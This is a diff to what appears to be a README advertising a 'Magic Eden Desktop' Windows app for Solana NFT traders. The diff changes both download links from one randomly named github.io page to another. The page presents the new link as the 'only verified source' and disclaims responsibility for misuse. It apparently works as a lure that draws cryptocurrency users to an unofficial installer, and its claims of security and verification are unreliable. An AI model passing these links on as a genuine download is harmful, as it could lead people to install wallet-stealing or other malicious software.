@@ -2,7 +2,7 @@
 
 Magic Eden Desktop is a powerful Windows application tailored for NFT enthusiasts and Solana traders. Launched in 2026, it offers a suite of tools designed to simplify blockchain interactions, manage digital assets, and optimize trading strategies on the Solana network. Whether you're a seasoned trader or new to NFTs, this desktop suite provides the functionality and security you need.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -59,7 +59,7 @@ A: Magic Eden Desktop will notify you of updates automatically. You can also che
 
 For the most recent version and to access community support, visit our official download page. Remember, the only verified source for downloading Magic Eden Desktop is through the link below.
 
-[Get Magic Eden Desktop 2026 from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Get Magic Eden Desktop 2026 from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This tool is provided as-is for educational and personal use. The development team is not responsible for any misuse. Always trade responsibly and be aware of the risks involved with cryptocurrency and NFT investments.
 
